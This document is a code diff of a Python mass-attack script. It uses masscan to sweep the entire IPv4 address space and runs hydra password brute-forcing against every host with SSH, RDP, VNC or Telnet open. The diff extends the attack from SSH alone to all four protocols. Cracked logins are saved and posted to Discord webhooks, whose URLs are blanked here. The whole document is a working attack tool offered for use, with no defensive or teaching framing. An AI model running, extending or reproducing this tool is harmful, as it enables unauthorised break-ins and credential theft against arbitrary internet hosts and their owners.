@@ -7,8 +7,8 @@ import ipaddress
 import json
 import requests
 
-DISCORD_STATS_WEBHOOK_URL = "https://discord.com/api/webhooks/your_stats_webhook_here"
-DISCORD_HIT_WEBHOOK_URL = "https://discord.com/api/webhooks/your_hit_webhook_here"
+DISCORD_STATS_WEBHOOK_URL = ""
+DISCORD_HIT_WEBHOOK_URL = ""
 
 UFILE = "users.txt"
 PFILE = "passes.txt"
@@ -22,7 +22,7 @@ end_ip = ipaddress.IPv4Address("255.255.255.254")
 
 RATE = "30000"
 WORKERS = 1000
-PORT = 22
+PORTS = "22,3389,5900,23"  # SSH, RDP, VNC, Telnet,mayb adding more protoclls
 BATCH = 250000
 
 q = queue.Queue()
@@ -30,6 +30,25 @@ stats = {"scanned_ips": 0, "hits": 0, "fails": 0, "errors": 0}
 active_hydra = 0
 hydra_lock = threading.Lock()
 current_range = "N/A"
+
+protocols = {
+    "ssh": {
+        "port": 22,
+        "cmd": f"hydra -L {UFILE} -P {PFILE} {{ip}} ssh -t 4 -T 5 -W 1 -V 2>&1"
+    },
+    "rdp": {
+        "port": 3389,
+        "cmd": f"hydra -L {UFILE} -P {PFILE} {{ip}} rdp -t 4 -T 5 -W 1 -V 2>&1"
+    },
+    "vnc": {
+        "port": 5900,
+        "cmd": f"hydra -L {UFILE} -P {PFILE} {{ip}} vnc -t 4 -T 5 -W 1 -V 2>&1"
+    },
+    "telnet": {
+        "port": 23,
+        "cmd": f"hydra -L {UFILE} -P {PFILE} {{ip}} telnet -t 4 -T 5 -W 1 -V 2>&1"
+    }
+}
 
 def clear_screen():
     os.system("cls" if os.name == "nt" else "clear")
@@ -69,7 +88,7 @@ def send_discord_hit(hit_info):
 
 def discord_stats_periodic():
     while True:
-        time.sleep(10800)  # 3 Stunden warten
+        time.sleep(10800)  #3 Stunden
         send_discord_stats()
 
 def get_last_scanned_ip():
@@ -77,8 +96,6 @@ def get_last_scanned_ip():
         try:
             with open(CHECKPOINT_FILE, "r") as f:
                 last_ip_str = f.read().strip()
-                # Debug: Uncomment to see checkpoint read value
-                # print(f"[DEBUG] Loaded checkpoint: {last_ip_str}")
                 return ipaddress.IPv4Address(last_ip_str)
         except Exception as e:
             save_err(f"Checkpoint read error: {e}")
@@ -88,8 +105,6 @@ def save_last_scanned_ip(ip):
     try:
         with open(CHECKPOINT_FILE, "w") as f:
             f.write(str(ip))
-        # Debug: Uncomment to see checkpoint saving
-        # print(f"[DEBUG] Saved checkpoint: {ip}")
     except Exception as e:
         save_err(f"Checkpoint save error: {e}")
 
@@ -103,27 +118,35 @@ def save_err(err):
         f.write(f"{err}\n")
     stats["errors"] += 1
 
-def brute(ip):
+def brute(ip, port):
     global active_hydra
     with hydra_lock:
         active_hydra += 1
-    # Debug: Uncomment to log when Hydra starts for an IP
-    # print(f"[DEBUG] Running Hydra on {ip}")
-    cmd = f"hydra -L {UFILE} -P {PFILE} {ip} ssh -t 4 -T 5 -W 1 -V 2>&1"
+    protocol = None
+    cmd_template = None
+    for proto, details in protocols.items():
+        if details["port"] == port:
+            protocol = proto
+            cmd_template = details["cmd"]
+            break
+    if cmd_template is None:
+        with hydra_lock:
+            active_hydra -= 1
+        return
+    cmd = cmd_template.format(ip=ip)
     try:
         res = subprocess.run(cmd, shell=True, capture_output=True, text=True).stdout
     except Exception as e:
-        save_err(f"Hydra exception on {ip}: {e}")
+        save_err(f"Hydra exception on {ip}:{port} ({protocol}): {e}")
         with hydra_lock:
             active_hydra -= 1
         return
     found = False
     for line in res.splitlines():
-        if "[22][ssh]" in line and "login:" in line and "password:" in line and ("success" in line.lower() or "[SUCCESS]" in line):
-            # Debug: Uncomment to see successful hits
-            # print(f"[DEBUG] Hydra success: {line}")
-            save_hit(line)
-            send_discord_hit(line)
+        if "login:" in line and "password:" in line and ("success" in line.lower() or "[success]" in line.lower()):
+            hit_info = f"Protocol: {protocol.upper()} | {line}"
+            save_hit(hit_info)
+            send_discord_hit(hit_info)
             found = True
         elif "error" in line.lower():
             save_err(line)
@@ -134,13 +157,12 @@ def brute(ip):
 
 def worker():
     while True:
-        ip = q.get()
-        if ip is None:
+        item = q.get()
+        if item is None:
             q.task_done()
             break
-        # Debug: Uncomment to see worker processing details
-        # print(f"[DEBUG] Worker processing IP: {ip}")
-        brute(ip)
+        ip, port = item
+        brute(ip, port)
         q.task_done()
 
 def scan():
@@ -150,25 +172,26 @@ def scan():
         next_ip = min(current_ip + BATCH - 1, end_ip)
         current_range = f"{current_ip} - {next_ip}"
         cmd = (
-            f"masscan -p {PORT} --open --rate={RATE} --wait 0 "
+            f"masscan -p {PORTS} --open --rate={RATE} --wait 0 "
             f"--range {str(current_ip)}-{str(next_ip)} "
             f"--output-format=json --output-filename={OUTPUT_FILE} "
             f"--exclude 255.255.255.255"
         )
-        # Debug: Uncomment to see the masscan command being executed
-        # print(f"[DEBUG] Running: {cmd}")
         subprocess.run(cmd, shell=True)
         try:
             with open(OUTPUT_FILE, "r") as f:
                 data = json.load(f)
             for entry in data:
                 ip_found = entry.get("ip")
-                if ip_found:
-                    q.put(ip_found)
-                    stats["scanned_ips"] += 1
+                ports = entry.get("ports", [])
+                for port_entry in ports:
+                    port_number = port_entry.get("port")
+                    for proto, details in protocols.items():
+                        if details["port"] == port_number:
+                            q.put((ip_found, port_number))
+                            stats["scanned_ips"] += 1
+                            break
         except Exception as e:
-            # Debug: Uncomment to see parsing errors
-            # print(f"[DEBUG] Failed to parse masscan output: {e}")
             save_err(f"Failed to parse masscan output: {e}")
         save_last_scanned_ip(next_ip + 1)
         current_ip = next_ip + 1
@@ -200,8 +223,6 @@ def show_stats():
         print("==============")
 
 def run():
-    # Debug: Uncomment to indicate workers are starting
-    # print("[DEBUG] Starting workers...")
     start_workers()
     threading.Thread(target=scan, daemon=True).start()
     threading.Thread(target=show_stats, daemon=True).start()
